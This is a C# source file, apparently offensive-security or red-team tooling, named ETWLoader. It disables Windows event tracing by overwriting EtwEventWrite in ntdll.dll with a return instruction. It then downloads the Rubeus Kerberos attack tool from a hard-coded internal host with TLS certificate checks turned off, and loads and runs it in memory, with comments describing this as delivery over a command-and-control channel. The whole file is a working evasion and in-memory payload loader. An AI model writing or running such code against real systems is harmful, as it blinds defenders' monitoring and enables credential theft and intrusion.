using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Threading.Tasks;

namespace ETWLoader
{
    internal class Program
    {
        /*static void Main(string[] args)*/
        static async Task Main(string[] args)   
        {
            // get location of ntdll.dll
            var hModule = Win32.LoadLibrary("ntdll.dll");
            Console.WriteLine("ndtll: 0x{0:X}", hModule.ToInt64());

            // find EtwEventWrite
            var hfunction = Win32.GetProcAddress(
                hModule, 
                "EtwEventWrite");
            Console.WriteLine("EtwEventWrite: 0x{0:X}", hfunction.ToInt64());

            var patch = new byte[] { 0xC3 };

            // mark as RW
            Win32.VirtualProtect(
                hfunction, 
                (UIntPtr)patch.Length, 
                Win32.MemoryProtection.ReadWrite, 
                out var oldProtect);
            Console.WriteLine("Memory: 0x{0:X} -> 0x04", oldProtect);

            // write a ret
            Marshal.Copy(patch, 0, hfunction, patch.Length);

            // restore memory
            Win32.VirtualProtect(
                hfunction, 
                (UIntPtr)patch.Length, 
                oldProtect, 
                out _);
            Console.WriteLine("Memory: 0x04 -> 0x{0:X}", oldProtect);

            // pretend this is coming down a C2 as a byte[]
            byte[] bytes;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    bytes = await client.GetByteArrayAsync("https://192.168.231.128:443/Rubeus.exe");
                }
            }

            // pretend this is coming down a C2 as a byte[]
            /*var bytes = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");*/

            // load the assembly
            var assembly = Assembly.Load(bytes);

            // invoke its entry point with arguments
            assembly.EntryPoint.Invoke(null, new object[] { args });
        }
    }
}
